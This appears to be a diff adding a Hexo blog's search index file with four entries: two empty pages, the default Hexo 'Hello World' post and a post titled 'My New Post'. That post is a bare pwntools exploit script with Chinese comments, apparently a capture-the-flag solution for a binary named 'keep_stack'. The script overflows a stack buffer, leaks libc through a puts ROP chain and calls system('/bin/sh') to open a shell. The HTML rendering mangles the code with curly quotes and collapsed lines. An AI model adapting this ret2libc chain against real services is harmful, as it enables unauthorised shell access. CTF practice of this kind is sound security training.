@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title></title>
+      <link href="/2026/04/16/movies/index/"/>
+      <url>/2026/04/16/movies/index/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2026/04/16/music/index/"/>
+      <url>/2026/04/16/music/index/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>My New Post</title>
+      <link href="/2026/04/16/My-New-Post/"/>
+      <url>/2026/04/16/My-New-Post/</url>
+      
+        <content type="html"><![CDATA[<span id="more"></span><p>#!&#x2F;usr&#x2F;bin&#x2F;env python3<br>from pwn import *</p><p>context.arch &#x3D; “amd64”<br>context.os &#x3D; “linux”<br>context.log_level &#x3D; “debug”</p><p>elf &#x3D; ELF(“.&#x2F;keep_stack”, checksec&#x3D;False)<br>libc &#x3D; ELF(“.&#x2F;libc.so.6”, checksec&#x3D;False)</p><h1 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h1><p>def start_local():<br>    return process([“.&#x2F;ld-linux-x86-64.so.2”, “.&#x2F;keep_stack”], env&#x3D;{“LD_PRELOAD”: “.&#x2F;libc.so.6”})</p><h1 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h1><p>def start():<br>    return start_local()<br>    # return remote(“host”, 12345)</p><p>OFFSET &#x3D; 0xA8<br>POP_RDI_RET &#x3D; 0x4011E1<br>RET &#x3D; 0x4011E2<br>PUTS_PLT &#x3D; 0x401090<br>PUTS_GOT &#x3D; 0x404120<br>VULN &#x3D; 0x4016C8</p><p>def send_stage(io, payload, length_words&#x3D;0x80):<br>    # length 是“索引上限”，需要足够大才能覆盖 RIP<br>    # 0x80 对应最多写到 0x100 偏移，足够覆盖 0xA8<br>    assert len(payload) % 2 &#x3D;&#x3D; 0<br>    assert b”\n” not in payload, “payload 含 0x0a 会被提前截断”</p><pre><code>io.recvuntil(b&quot;length: &quot;)io.sendline(str(length_words).encode())io.recvuntil(b&quot;What do you want to say? &quot;)io.send(payload + b&quot;\n&quot;)</code></pre><p>def p64n(x):<br>    return p64(x)</p><p>while True:<br>    io &#x3D; start()</p><pre><code># ---------------- stage 1: leak puts ----------------rop1 = flat(    b&quot;A&quot; * OFFSET,    p64n(POP_RDI_RET),    p64n(PUTS_GOT),    p64n(PUTS_PLT),    p64n(VULN),)# 避免换行截断if b&quot;\n&quot; in rop1:    io.close()    continuesend_stage(io, rop1)# 吃掉 input 回显行io.recvuntil(b&quot;input: &quot;)io.recvline()# puts 泄漏行leak_line = io.recvline().rstrip(b&quot;\n&quot;)leak = u64(leak_line.ljust(8, b&quot;\x00&quot;))log.success(f&quot;leaked puts = {hex(leak)}&quot;)libc.address = leak - libc.sym[&quot;puts&quot;]system_addr = libc.sym[&quot;system&quot;]binsh_addr = next(libc.search(b&quot;/bin/sh\x00&quot;))log.success(f&quot;libc base = {hex(libc.address)}&quot;)log.success(f&quot;system    = {hex(system_addr)}&quot;)log.success(f&quot;/bin/sh   = {hex(binsh_addr)}&quot;)# ---------------- stage 2: system(&#39;/bin/sh&#39;) ----------------rop2 = flat(    b&quot;B&quot; * OFFSET,    p64n(RET),            # 栈对齐（可选但建议）    p64n(POP_RDI_RET),    p64n(binsh_addr),    p64n(system_addr),)# 如果地址里出现 0x0a，会被这题输入逻辑截断；重开一把即可if b&quot;\n&quot; in rop2:    log.warning(&quot;stage2 payload has 0x0a, retrying...&quot;)    io.close()    continuesend_stage(io, rop2)io.interactive()break</code></pre>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2026/04/16/hello-world/"/>
+      <url>/2026/04/16/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
+</search>
